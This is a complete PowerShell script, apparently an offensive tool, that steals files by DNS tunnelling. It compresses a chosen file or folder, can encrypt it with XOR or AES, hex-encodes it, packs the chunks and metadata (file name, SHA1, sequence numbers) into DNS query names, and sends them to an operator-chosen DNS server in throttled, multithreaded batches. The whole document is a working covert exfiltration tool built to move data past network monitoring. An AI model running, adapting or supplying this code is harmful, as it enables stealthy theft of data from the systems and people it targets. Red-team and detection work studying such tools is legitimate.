[CmdletBinding()] Param(
        
    [Parameter(Position = 0, Mandatory = $True)]
    [AllowEmptyString()]
    [String]
    $Path,

    [Parameter(Mandatory = $True, HelpMessage="DNS server to direct the DNS requests")]
    [String]
    $DNSServer,

    [Parameter(Mandatory = $False, HelpMessage="Specify an ASCII password to encrypt the file content before exfiltration")]
    [String]
    $Password="",
    
    [Parameter(Mandatory = $False, HelpMessage="Specify the encryption method to use (XOR or AES)")]
    [ValidateSet('AES', 'XOR')]
    [String]$EncryptionMethod,
      
    [Parameter(Mandatory = $False, HelpMessage="Domain name to append to the DNS requests")]
    [String]
    $DomainName="t.co",

    [Parameter(Mandatory = $False)]
    [Switch]
    $DontCompress=$False,
      
    [Parameter(Mandatory = $False, HelpMessage="Number of threads in charge of exfiltrating the data via DNS requests")]
    [String]
    $Threads=1,
      
    [Parameter(Mandatory = $False, HelpMessage="Seconds to wait before sending another batch of data to the server")]
    [String]
    $Throttle=0.5
)

##### GLOBALS ######
$REFSIZE=5         #
$SEQSIZE=6         #
$MAXQUERYSIZE=67   # I've found this is the max size of a dns query in Win/Linux systems. Using a bigger number will produce a local error.
####################

# Non native zip file function
# Extracted from https://devblogs.microsoft.com/scripting/use-powershell-to-create-zip-archive-of-folder/
function My-Compress
{
    param([String]$Source)

    $Compressed=$False

    $LeafName=Split-Path $Source -leaf
    $outFolder=$Source

    # Check if the source is a file or a dir, as CreateFromDirectory will fail for files
    if (Test-Path -Path $Source -PathType Leaf){
        # This is a file, not a directory, so we create a folder to compress
        $filePath=$Source
        $fileNameNoExt=[io.path]::GetFileNameWithoutExtension($filePath)
        $outFolder="$env:TEMP\$fileNameNoExt\"
        if (-not (Test-Path -Path $outFolder -PathType Container)){
            New-Item -ItemType Directory $outFolder
        }
        Copy-Item $filePath -Destination $outFolder
    }
    
    $CompFile=$env:TEMP+"\"+$LeafName+".zip"

    # Delete the zip if already existed
    if (Test-Path $CompFile){
        Remove-Item $CompFile
    }

    Add-Type -Assembly System.IO.Compression.FileSystem
    $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal
    [System.IO.Compression.ZipFile]::CreateFromDirectory($outFolder, $CompFile, $compressionLevel, $false)
    if ($?){
        $Compressed=$True
    }

   return $Compressed,$CompFile
}

function Compress
{
    param ([String]$FilePath)

    $CompFile=$FilePath
    $Compressed=$False

    # Check if cmdlet already exists or we have to send the file unzipped
    $compcmd=Get-Command Compress-Archive -ErrorAction SilentlyContinue
    if ($null -eq $compcmd.Name){
        # Use the bespoke function to compress files
        $Compressed,$CompFile=My-Compress -Source $FilePath
    }
    else {
        $FileName=Split-Path $FilePath -leaf
        $CompFile=$env:TEMP+"\"+$FileName+".zip"
        # Delete the zip if already existed
        if (Test-Path $CompFile){
            Remove-Item $CompFile
        } 
        Compress-Archive -Path $FilePath -DestinationPath $CompFile -CompressionLevel Optimal
        if ($?){
            $Compressed=$True
        }
        else{
            $Compressed=$False
            $CompFile=$FilePath
        }
    }
    return $Compressed,$CompFile
}

<#
    .SYNOPSIS
    This funciton converts an integer in base 10 to a base 36. This function is extracted form https://ss64.com/ps/syntax-base36.html
    .PARAMETER Num
    This is the decimal number to convert to base 36
#>
function ConvertTo-Base36
{
    [CmdletBinding()]
    param (
        [int]$Num=0,
        [int]$Padding=7

    )
    $alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    do
    {
        $remainder = ($Num % 36)
        $char = $alphabet.substring($remainder,1)
        $base36Num = "$char$base36Num"
        $Num = ($Num - $remainder) / 36
    }
    while ($Num -gt 0)

    $base36Num=$base36Num.PadLeft($Padding,"0")
    return $base36Num
}


<#
    .SYNOPSIS
    This funciton converts a base 36 number to an integer in base 10. This function is extracted form https://ss64.com/ps/syntax-base36.html
    .PARAMETER base36Num
    This is the decimal number to convert from base 36 to decimal
#>
function ConvertFrom-base36
{
    [CmdletBinding()]
    param ([parameter(valuefrompipeline=$true, HelpMessage="Alphadecimal string to convert")][string]$base36Num="0")
    $alphabet = "0123456789abcdefghijklmnopqrstuvwxyz"
    $inputarray = $base36Num.tolower().tochararray()
    [array]::reverse($inputarray)
    [long]$decNum=0
    $pos=0

    foreach ($c in $inputarray)
    {
        $decNum += $alphabet.IndexOf($c) * [long][Math]::Pow(36, $pos)
        $pos++
    }
    return $decNum
}

<#
.SYNOPSIS 
This function encrypt with XOR a string or a file. This is waaaaay more slow than AES encryption. This method is only useful for small files. Big files will take ages to encrypt.
#>
function XOR
{
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    switch ($Mode) {
        'Encrypt' {
            Write-Host "Encrypting using XOR before sending the data"
            $enc = [system.Text.Encoding]::UTF8
            $PasswordBytes = $enc.GetBytes($Password);
            $encryptedBytes=@()

            $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
            if (!$File.FullName) {
                Write-Error -Message "File to encrypt not found!"
                break
            }
            $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
            $outPath = $File.FullName + ".xor"

            # XOR the bytes of the payload with the password
            for($i=0; $i -lt $plainBytes.count ; $i++)
            {
                $encryptedBytes += (($plainBytes[$i]) -bxor ($PasswordBytes[$i%($PasswordBytes.Length)]))
                Write-Progress -Activity 'Encrypting file' -Status 'XORing file before exfiltrating' -PercentComplete (($i/($plainBytes.Length))*100)
            }
            [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)

            return $outPath
        }
        'Decrypt' {
            $enc = [system.Text.Encoding]::UTF8
            $PasswordBytes = $enc.GetBytes($Password);
            $decryptedBytes=@()

            $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
            if (!$File.FullName) {
                Write-Error -Message "File to decrypt not found!"
                break
            }
            $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
            $outPath = $File.FullName + ".decrypted"

            # XOR the bytes of the payload with the password
            for($i=0; $i -lt $plainBytes.count ; $i++)
            {
                $decryptedBytes += (($plainBytes[$i]) -bxor ($PasswordBytes[$i%($PasswordBytes.Length)]))
                Write-Progress -Activity 'Encrypting file' -Status 'XORing file before exfiltrating' -PercentComplete (($i/($plainBytes.Length))*100)
            }
            [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)

            return $outPath
        }
    }
}

# AES enc/dec function slightly modified form this URL: from https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
<#
.SYNOPSIS
Encryptes or Decrypts Strings or Byte-Arrays with AES
 
.DESCRIPTION
Takes a String or File and a Key and encrypts or decrypts it with AES256 (CBC)
 
.PARAMETER Mode
Encryption or Decryption Mode
 
.PARAMETER Key
Key used to encrypt or decrypt
 
.PARAMETER Text
String value to encrypt or decrypt
 
.PARAMETER Path
Filepath for file to encrypt or decrypt
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
 
Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded cipher text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function AES {
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return $outPath
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return $outPath
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

<#
    .SYNOPSIS
    This function initialize the metadata frames to send to the server.
    The metadata frames have a sequence number of 000000 and contains the following data:
    * REF ID: 5 bytes/chars. This is a random alphanumeric string of 5 chars that identifies the transaction
    * SEQ N#: 6 bytes/chars. This is a base36 number that would allow to reassemble the data in the server side. For the metadata frame it has to be 00000.
    * Type: 1 byte/chars: This is a flag that would tell the type of transaction:
        ** Value 0: Undefined
        ** Value 1: Archive to to exfiltrate (contains the SHA1 at the end of the payload)
        ** Value 2: Response to a command (contains the SHA1 at the end of the payload)
        ** Value 3: Heartbeat
        ** Value 4: File name being sent (if filename is sent, the following placeholders will not be present in the payload)
    * Lenght: 6 bytes/chars. This is a base36 number that would tell the server how many packages are going to be send in this transaction.
    * Compressed: 1 byte/chars. This is a flag that would tell the server if the content is zipped or not.
    * Encrypted: 1 byte/chars. This is a flag that would tell whether the content is encrypted and with wat algorithm:
        ** Value 0: Not encrypted
        ** Value 1: AES
        ** Value 2: XOR
    * [SHA1]: If the type of the frame was not 4 (file name), then we append the SHA1 of the transaction content at the end of the frame
#>
function Initialize-Metadata
{
    param(
        [String]$Ref,
        [int]$Length,
        [bool]$Compressed,
        [String]$Encrypted,
        [String]$FilePath,
        [String]$CommandResponse,
        [bool]$Heartbeat
    )

    $Queries=@()

    # Sequence number is going to be 0 for a metadata frame
    $SEQ=ConvertTo-Base36 -Num "0" -Padding $SEQSIZE
    $query="$Ref$SEQ"
    $hash=$null

    # Is this a file or a response to a command? (TODO: Execute commands)
    if (-not $null -eq $FilePath -and (Test-Path($FilePath)))
    {
        $hash=(Get-FileHash -Path $FilePath -Algorithm SHA1).Hash
        $query+="1"

        # Now, create a second query frame that would contain the name of the file being transferred
        $query_fname="$Ref$SEQ"
        $query_fname+="4" # This frame is going to contain the name of the file being sent
        # Encode the file name as UTF8 bytes
        $Fname=Split-Path -Path $FilePath -Leaf
        $FnameBytes = [System.Text.Encoding]::ASCII.GetBytes($Fname) # TODO: This could crash if the name is not ASCII
        # $FnameBytesSrt = $FnameBytes -join ""
        $FnameBytesSrt = ([System.BitConverter]::ToString($FnameBytes)).Replace("-","")
        $MaxFnameSize=$MAXQUERYSIZE-($query_fname.Length)-$DomainName.Length-1
        $FnameBytesSrt=($FnameBytesSrt[0..$MaxFnameSize]) -join "" # Trim the ending of the file name if it is too long to fit in a single query
        $query_fname+="$FnameBytesSrt.$DomainName"
        
        $Queries+=$query_fname
    }
    elseif(-not $null -eq $CommandResponse)
    {
        $stringAsStream = [System.IO.MemoryStream]::new()
        $writer = [System.IO.StreamWriter]::new($stringAsStream)
        $writer.write($CommandResponse)
        $writer.Flush()
        $stringAsStream.Position = 0
        $hash=(Get-FileHash -InputStream $stringAsStream -Algorithm SHA1).Hash
        $query+="2"
    }
    elseif(-not $null -eq $Heartbeat)
    {
        $query+="3"
    }   

    $LSTR=ConvertTo-Base36 -Num "$Length" -Padding $SEQSIZE
    $query+="$LSTR"
    # Compressed?
    if ($True -eq $Compressed)
    {
        $query+="1"
    }
    else 
    {
        $query+="0"
    }
    
    # Encrypted?
    if ($Encrypted -eq "AES")
    {
        $query+="1"
    }
    elseif($Encrypted -eq "XOR")
    {
        $query+="2"
    }
    else 
    {
        $query+="0"
    }

    if ($null -ne $hash)
    {
        $query+="$hash"
    }
    $query+=".$DomainName"
    
    $Queries+=$query

    return $Queries
}

<#
    .SYNOPSIS
    This function splits the content of the file to be sent and if required, encrypt it. It also takes into consideration
    the size of the metadata sent in the DNS query. The DNS query follows this format REF-SEQ-DATA.<domain>. 
    REF: Will be a random 5 bytes string generated by the client.
    SEQ: Will be a 6 bytes Base36 string that will be incremented for each data packet. A base 36 string will allow us to send more than 2 thousand million DNS requests (36^6)
    .
#>
function Initialize-Content
{
    param([String]$Path)
    
    # Reading content of the file fast as bytes (https://powershellmagazine.com/2014/03/17/pstip-reading-file-content-as-a-byte-array/)
    $Content=Get-Content -Path $Path -Encoding Byte -ReadCount 0
    $Compressed=(-not $DontCompress)
    $Encrypted=$null
    $DeliverContent=@()
    $Chunks=@()
    $Queries=@()

    # Encrypt with AES the content if the user has specified a password in the parameters
    if ($Password -ne "")
    {
        Write-Host "Encrypting file $Path before exfiltrating"
        $EncFile=$null
        if ($EncryptionMethod -eq "AES")
        {
            $EncFile=AES -Mode Encrypt -Key $Password -Path $Path
        }
        #if ($EncryptionMethod -eq "XOR")
        else # If explicit encryption method is not specified, we will use XOR
        {
            $EncFile=XOR -Mode Encrypt -Key $Password -Path $Path
        }
        $DeliverContent=Get-Content -Path $EncFile -Encoding Byte -ReadCount 0
        $Path=$EncFile
    }
    else 
    {
        $DeliverContent=$Content
    }

    # Encode the encrypted bytes into a base64 string
    # $EncodedData =[Convert]::ToBase64String($DeliverContent) # Base64 can't be used for DNS requests, there are forbidden chars and is case insensitive
    $EncodedData= ($DeliverContent |ForEach-Object {[System.Bitconverter]::ToString($_)}) -join ""
    
    # Create the sequential chunks, including the REF and SEQ numbers
    $REF=(-join ((65..90) + (97..122) | Get-Random -Count $REFSIZE | ForEach-Object {[char]$_})) # Code from https://devblogs.microsoft.com/scripting/generate-random-letters-with-powershell/
    $DataSize=$MAXQUERYSIZE-($REF.Length)-($SEQSIZE)-$DomainName.Length-1 # Minus one, counting with the dot to separate the domain name
    $NQueries=[math]::Ceiling([int]($EncodedData.Length/$DataSize))

    # Create the metadata queries first
    $Meta_Queries=(Initialize-Metadata -Ref $REF -Length $EncodedData.Length -Compressed $Compressed -Enc $EncryptionMethod -FilePath $Path)
    $Queries+=$Meta_Queries

    # Create the data queries after this
    # Fill the chunks including the REF and SEQ data
    $Pointer=0
    $nquery=0
    for ($qn = 0; $qn -le $NQueries; $qn++)
    {
        $nquery+=1
        $inc=0
        $SEQ=ConvertTo-Base36 -Num "$nquery" -Padding $SEQSIZE
        if ($qn -lt ($NQueries))
        {
            $inc=$DataSize
        }
        else {
            # The last package is not going to be of size $QuerySize
            $inc=$EncodedData.Length%$DataSize
        }
        
        $data=($EncodedData[$Pointer..($Pointer+$inc-1)]) -join ""
        $chunk="$REF$SEQ$data.$DomainName"
        # Add the chunk to the array
        $Chunks+=$chunk
        $Pointer+=$inc
    }

    $Queries+=$Chunks
    Write-host "Sending $($Queries.Length) DNS queries to the DNS server"

    return $Queries
}

function Exfiltrate-Data
{
    param([Array]$Queries)

    # number of iterations will be the number of queries divided by the number of threads
    $nIters = [math]::Ceiling([int]$Queries.Length/$Threads)
    # I want to know how much time does this take depending on the number of threads specified
    Measure-Command {
        # TODO: Paralellize this job to speed up the transfer
        $Pointer=0
        for ($i=0;$i -lt $nIters;$i++){
            $Jobs=@()
            $nth=$Threads
            if ($i -eq $nIters-1)
            {
                $nth=(($Queries.Length)-$Pointer)
            }
            # Extract the array of chunks to send to the DNS resolv threads
            $CurrentQueries=$Queries[$Pointer..($Pointer+$nth-1)]
            # Launch $nth threads 
            for ($t=0;$t -lt $nth;$t++)
            {
                $Block =  
                { 
                    param(
                        [String]$cq,
                        [String]$dns
                    )
                    Write-Host "#Querying for $cq to the server $dns"
                    Resolve-DnsName -Server $dns -Name $cq -Type A -NoRecursion -NoHostsFile -DnsOnly -QuickTimeout
                } 
                # Append the job to the array of jobs
                $Jobs+=(Start-Job -ScriptBlock $Block -ArgumentList $CurrentQueries[$t], $DNSServer)
            }

            # Wait until the jobs are finished and then delete the job
            $Completed=$False
            while (-not $Completed){
                $Completed=$True
                for ($t=0;$t -lt $nth;$t++){
                    $job=Get-Job -Id $($Jobs[$t].Id)
                    if ($job.State -eq "Running"){
                        Write-Debug "Job $($job.Id) is still running"
                        $Completed=$False
                    }
                }
                Start-Sleep -Seconds $Throttle
            }
            Write-Host "The $nth jobs in the batch #$($i+1)/$nIters are completed"
            
            $Pointer+=$nth
        }
    }
    
}

function Main
{
    $RecurseFolder=$False
    # Compress the file or folder before sending it
    if (-not $DontCompress)
    {
        $Compressed,$CompFile=Compress -FilePath $Path
        if ($Compressed){
            Write-Host "$Path has been compressed to the file $CompFile"
        
            # Now, after the compression, prepare the data to send
            $Queries=Initialize-Content -Path $CompFile
    
            # Now, send the content via DNS queries
            Exfiltrate-Data -Queries $Queries
        }
        else {
            if ((Get-Item $Path) -is [System.IO.DirectoryInfo]){
                $RecurseFolder=$True
            }
            Write-Host "$Path could not be compressed. Aborting execution."
        }
    }
    else 
    {
        Write-Host "TODO: Sending uncompressed content"
        
        # Now, after the compression, prepare the data to send
        $Queries=Initialize-Content -Path $Path

        # Now, send the content via DNS queries
        Exfiltrate-Data -Queries $Queries
    }
    

}

Main
